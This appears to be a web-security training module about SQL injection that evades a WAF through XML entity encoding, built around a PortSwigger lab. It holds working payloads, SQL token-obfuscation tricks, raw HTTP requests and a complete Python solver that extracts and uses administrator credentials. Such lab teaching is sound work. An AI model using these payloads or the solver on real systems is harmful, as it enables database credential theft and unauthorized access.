---
title: WAF Bypass & XML Encoding
description: Why a firewall sees entity text while the database sees keywords — decode order, token boundaries, and the XML encoding lab.
---

# WAF Bypass & XML Encoding · The Parser Gap

<p class="wd-section-lede">A Web Application Firewall (WAF) and a database engine do not see the same string. A WAF inspects the raw request at the front gate, looking for banned words like <code>SELECT</code>. But the database only receives your input <em>after</em> an internal XML parser converts entity codes like <code>&#x53;</code> back into real letters. That timing gap between when security checks run and when data is decoded is the secret to bypassing filters.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Disassembled Tool.</strong> Imagine security guards at a building entrance searching bags for crowbars. If you walk in carrying a crowbar, you get stopped immediately. But what if you mail a box labeled "flat-pack metal rods", and inside the mailroom, an automated robot unpacks the rods, screws them together into a crowbar, and hands it to the worker inside? That is XML entity encoding: the WAF sees harmless code points (<code>&#x53;ELECT</code>), while the backend XML parser automatically reassembles the live SQL command before handing it to the database!</p>
</div>

## Case File #4: Exploiting the Parser Disagreement

Let's trace how an XML stock-check request bypasses a strict firewall filter:

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You check store inventory. The browser submits an XML payload to <code>/product/stock</code> containing <code>&lt;storeId&gt;1&lt;/storeId&gt;</code>. Trying to inject a standard payload like <code>1 UNION SELECT NULL</code> triggers an immediate block: <code>403 Forbidden: "Attack Detected"</code>.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The HTTP request passes through two separate layers. The WAF inspects the raw XML body for blacklisted keywords. After the WAF lets the request pass, the application's XML parser resolves numeric character entities (converting <code>&#x53;</code> into <code>S</code>) and glues the decoded text into the SQL query:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Application Query</span>
        <span><span class="wd-code-input">Gold</span> = Decoded XML Payload</span>
      </div>
      <span class="wd-code-dev">SELECT units FROM stock WHERE storeId = </span><span class="wd-code-input">1 UNION SELECT username || '~' || password FROM users</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>Because the WAF checked the raw text <em>before</em> entity decoding happened, it scanned for the literal word <code>SELECT</code> and found nothing suspicious. But the database executed the command <em>after</em> entity decoding, running the full injected query without any hindrance!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers use parameterized queries inside XML endpoints rather than dynamic string concatenation. Firewalls should also be configured with canonicalization—decoding XML entities and URL escapes <em>before</em> running inspection rule sets.</p>
  </div>
</div>

### Visual Comparison: What the WAF Scans vs. What SQL Executes

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the WAF Saw (Raw HTTP Body)</span>
    <p><code>&lt;storeId&gt;&amp;#x31;&amp;#x20;&amp;#x55;NION &amp;#x53;ELECT...&lt;/storeId&gt;</code><br>
    The signature scanner found no forbidden words like <code>SELECT</code> or <code>UNION</code>, so it waved the request through.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What the Database Executed (Decoded Value)</span>
    <p><code>SELECT units FROM stock WHERE storeId = 1 UNION SELECT username || '~' || password FROM users</code><br>
    The XML parser automatically translated every numeric entity, feeding raw SQL commands into the database.</p>
  </div>
</div>

---

## Decode Layers: Order Matters More Than Encryption

Bypasses do not rely on "magic keywords." They exploit **timing disagreements about when decoding occurs**:

<div class="wd-flow">
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>1. Frontline WAF</strong>
    Scans raw HTTP / URL-decoded bytes. Sees only <code>&amp;#x53;ELECT</code>!
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>2. Backend XML Parser</strong>
    Decodes character references: converts <code>&amp;#x53;</code> into <code>S</code>.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>3. Database SQL Parser</strong>
    Receives fully assembled live SQL: executes <code>SELECT</code>!
  </div>
</div>

| Layer | Transformation | Example | Who Typically Inspects It |
| --- | --- | --- | --- |
| **HTTP URL** | Percent-decoding | `%27` → `'` | Reverse proxy, framework, WAF |
| **Form Body** | `+` to space, percent-decoding | `UNION+SELECT` | Framework parser |
| **XML Parser** | Character &amp; entity decoding | `&#x53;` → `S` | Application XML parser |
| **JSON Parser** | Unicode escapes | `\u0053` → `S` | JSON parser |
| **HTML Parser** | Entity decoding | `&lt;` → `<` | Browser or HTML sanitizer |
| **Database Lexer** | Comment stripping &amp; concatenation | `UNION/**/SELECT` | Database SQL engine |

> **💡 The Golden Rule of Filter Bypasses:** Find the *last decoder* before user input reaches the database query. Encode your payload specifically for that decoder. If the WAF inspects bytes *before* that decoder runs, it only sees harmless entity references!

---

## XML Character References: Decimal vs. Hexadecimal

The XML specification requires parsers to automatically translate numeric character references into their target characters:

```xml
&#83;      <!-- Decimal: ASCII code point 83 = 'S' -->
&#x53;     <!-- Hexadecimal: 0x53 = 'S' -->
```

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">🛡️ Raw Request Body (What the WAF Scans)</span>
    <p><code>&amp;#x53;ELECT * FROM users</code><br>
    <code>&amp;#85;NION &amp;#83;ELECT</code><br>
    <code>1 &amp;#x55;NION &amp;#x53;ELECT ...</code></p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">⚙️ Value After XML Parse (What SQL Sees)</span>
    <p><code>SELECT * FROM users</code><br>
    <code>UNION SELECT</code><br>
    <code>1 UNION SELECT ...</code></p>
  </div>
</div>

::: details 🔬 Under the Hood: Why the Database Never Sees `&#x53;`
An XML parser does not perform a simple regex string replacement. The parser's tokenizer recognizes `&#` as an escape sequence, reads the numeric code point, validates it, and appends the resulting Unicode character directly into the text node in memory. 

By the time the application calls `node.getText()`, the characters are already plain text. The database receives standard SQL, and the WAF's regex pattern for `SELECT` never matches the incoming network packet!
:::

### Decimal vs. Hexadecimal Reference Comparison

| Form | Example for `S` | Advantages | Cautions |
| --- | --- | --- | --- |
| **Decimal** | `&#83;` | Universally supported across all XML/HTML parsers | Slightly longer character length |
| **Hexadecimal** | `&#x53;` | Compact; standard in Burp Suite's Hackvertor | Some basic filters check for `&#x` |
| **Named Entities** | `&apos;` | Convenient for quotes | Only 5 predefined entity names exist in XML |

---

## SQL Token Obfuscation Beyond XML

Beyond transport encodings, you can reshape the **SQL token stream** so signature-based filters fail to recognize queries while the database engine parses the exact same commands:

### 1. Inline Comments as Whitespace

SQL considers `/* ... */` to be valid whitespace between tokens:

```sql
UNION/**/SELECT/**/username/**/FROM/**/users
```

This bypasses WAF rules that strictly look for literal spaces like `UNION SELECT`. (Note: you cannot split inside a keyword like `SEL/**/ECT`, because that produces two separate tokens: `SEL` and `ECT`).

### 2. MySQL Versioned Comments

MySQL uniquely executes code contained within `/*! ... */` comments:

```sql
/*!50000SELECT*/ username FROM users
```

The number `50000` is a version gate (executes on MySQL 5.0.0+). A WAF may ignore comments entirely, but MySQL will execute the query inside!

### 3. Whitespace Alternatives

If a filter blocks the space character (`%20` or `+`), replace it with alternate whitespace characters accepted by SQL lexers:
- `%09` (Horizontal Tab)
- `%0A` (Line Feed)
- `%0C` (Form Feed)
- `%0D` (Carriage Return)

```sql
UNION%09SELECT%0Ausername%0CFROM%0Dusers
```

---

## XML Injection in Practice: The Numeric Context

Many web services receive XML payloads like this:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>2</storeId>
</stockCheck>
```

In this case, `storeId` is concatenated directly into a query **without quotes**:

```sql
SELECT units FROM stock WHERE storeId = 2
```

Because there are no single quotes to escape, your payload starts immediately with `1`:

```xml
<storeId>&#x31;&#x20;&#x55;NION&#x20;&#x53;ELECT&#x20;username&#x20;||&#x20;'~'&#x20;||&#x20;password&#x20;FROM&#x20;users</storeId>
```

When decoded by the XML parser, the query becomes:

```sql
SELECT units FROM stock WHERE storeId = 1 UNION SELECT username || '~' || password FROM users
```

### Burp Suite Hackvertor Workflow

Hackvertor is the standard tool for tag-based payload encoding:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Raw Attack Payload</strong>
    <code>1 UNION SELECT username || '~' || password FROM users</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>Hackvertor Hex Entities</strong>
    <code>&amp;#x31;&amp;#x20;&amp;#x55;&amp;#x4e;&amp;#x49;&amp;#x4f;&amp;#x4e; ... &amp;#x73;</code>
  </div>
</div>

1. Send the stock request to **Burp Repeater**.
2. Replace `storeId` with your raw SQL payload.
3. Highlight the payload, right click → **Extensions → Hackvertor → Encode → hex_entities**.
4. The tag `<@hex_entities>...</@hex_entities>` wraps your text and automatically converts every character to XML hex entities right as the request leaves Burp!

---

## Practice Lab: WAF Bypass & XML Encoding

Put this parser gap into action against a live Web Application Firewall protecting an XML inventory endpoint.

:::: lab

## Lab 1 · SQL injection with filter bypass via XML encoding {#lab-filter-bypass-xml-encoding}

**Vulnerability class:** in-band UNION through XML entity encoding.
**Goal:** retrieve the administrator credentials and log in.

The stock check accepts `productId` and `storeId` as XML. The response returns the stock count, which is a single value — so the injected `SELECT` must return exactly one column.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

<LabCheckbox lab-id="lab-filter-bypass-xml-encoding" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** The WAF blocks the word `SELECT` in the request body. What does the XML parser do to `&#x53;` before the application reads the value?

**Level 2 — target parameter and approach.** POST to `/product/stock` with an XML body. Confirm `storeId` is evaluated by trying `1+1`. Then send a one-column `UNION SELECT` with the credentials concatenated. Encode the payload as XML numeric character references (Hackvertor `hex_entities` or `dec_entities`) so the raw body contains no SQL keywords.

**Level 3 — exploit skeleton.**

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Step 1 — find the injection and the shape

```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1+1</storeId>
</stockCheck>
```

If the response returns stock for a different store, `storeId` is evaluated as an expression. A raw `1 UNION SELECT NULL` is blocked by the WAF. Once encoded, `1 UNION SELECT NULL` returns normally; adding a second column returns `0 units` or an error, implying the original query selects one column.

### Raw HTTP request (entity-encoded body)

Raw body after Hackvertor `hex_entities` (abridged):

```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</stockCheck>
```

Decoded by the XML parser, the value is:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The query becomes (note the absent quote — this is a numeric context):

```sql
SELECT units FROM stock WHERE storeId = 1 UNION SELECT username || '~' || password FROM users
```

The response renders rows such as `administrator~s3curepassword`. The WAF sees no `SELECT` token because every character is a numeric character reference.

### Every piece, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `1` | a valid store id | Makes the original query return normally |
| `UNION SELECT` | appends a result set | Must match the single-column shape |
| `username \|\| '~' \|\| password` | concatenation | Both credentials fit in one column |
| `FROM users` | row source | Crosses the table boundary |
| `&#x31;` … | hex character references | XML parser decodes to `1` before SQL sees it |
| `&#x20;` | encoded space | Separates SQL tokens without literal spaces in the body |
| `&#x7c;&#x7c;` | encoded `\|\|` | PostgreSQL concatenation operator |
| `<@hex_entities>` | Hackvertor tag | Editor-only wrapper; it is replaced by the encoded text before sending |
| `</storeId>` | closes the XML element | The decoded text is the value the app reads |

> **Why the WAF misses it.** The raw body contains `&#x55;&#x4e;...`, not `UNION` or `SELECT`. Unless the WAF parses XML and decodes character references before applying signatures, it has nothing to match. The application's XML parser, however, is *required* to decode them.

### Python `requests` solver

```python
import re
import sys

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def hex_entities(text: str) -> str:
    """Equivalent to Hackvertor's hex_entities tag."""
    return "".join(f"&#x{ord(ch):x};" for ch in text)

def main() -> None:
    s = requests.Session()

    # 1. Confirm the injection point evaluates expressions.
    probe = """<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1+1</storeId></stockCheck>"""
    r = s.post(f"{BASE}/product/stock", data=probe, headers={"Content-Type": "application/xml"}, timeout=20)
    print(f"[*] expression probe: HTTP {r.status_code}, {r.text[:80]!r}")

    # 2. Send the entity-encoded, single-column UNION payload.
    payload = (
        "1 UNION SELECT username || '~' || password FROM users "
        "WHERE username='administrator'"
    )
    encoded = hex_entities(payload)
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>{encoded}</storeId></stockCheck>"""

    r = s.post(f"{BASE}/product/stock", data=body, headers={"Content-Type": "application/xml"}, timeout=20)
    print(f"[*] exploit: HTTP {r.status_code}, {len(r.text)} bytes")

    pairs = dict(re.findall(r"([A-Za-z0-9_.-]+)~([A-Za-z0-9!@#$%^&*._-]+)", r.text))
    if "administrator" not in pairs:
        print("[!] Could not parse administrator credentials.")
        print("    Check the lab host, the single-column shape, and the entity encoding.")
        sys.exit(1)

    password = pairs["administrator"]
    print(f"[+] administrator password: {password}")

    # 3. Authenticate.
    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in. Lab solved.")
    else:
        print("[!] Login failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

> **Decimal alternative.** If a filter specifically blocks `&#x`, change `hex_entities` to `"".join(f"&#{ord(ch)};" for ch in text)`. The XML parser treats both forms identically; only the WAF's signature set differs.

### Why this works, in one sentence

The WAF makes its decision on the raw XML body, while the XML parser decodes character references before the application builds the query — so the two components disagree about what the input says.
:::

::::

<TopicComplete topic-id="sql-injection/waf-bypass-xml" label="Mark the WAF / XML module complete" />

---

## Before you move on

- Can you explain the difference between URL decoding and XML entity decoding, and which component performs each?
- Why does `&#x53;ELECT` survive a WAF but become `SELECT` for the database?
- Why can't `SEL/**/ECT` be used to hide the word `SELECT`?
- On which engine does `/*!50000SELECT*/` execute, and why is it a no-op elsewhere?
- In the XML lab, why must the injected `SELECT` return exactly one column?
- What would you try if the WAF decoded XML entities before matching?

## Where Phase 1 ends

You now have the full SQL injection stack:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>00 · Mental Model</strong>
    Data vs Control
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>01 · UNION Attacks</strong>
    Result set shapes
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>02 · Fingerprinting</strong>
    Dialects &amp; catalogs
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>03 · Blind SQLi</strong>
    Inference channels
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>04 · WAF &amp; XML</strong>
    Decode ordering
  </div>
</div>

The next phase will reuse the same infrastructure — manifest, progress store, lab blocks — for a different vulnerability class. The mechanics will change; the method will not: find the parser boundary, identify the decode order, and derive the payload instead of recalling it.
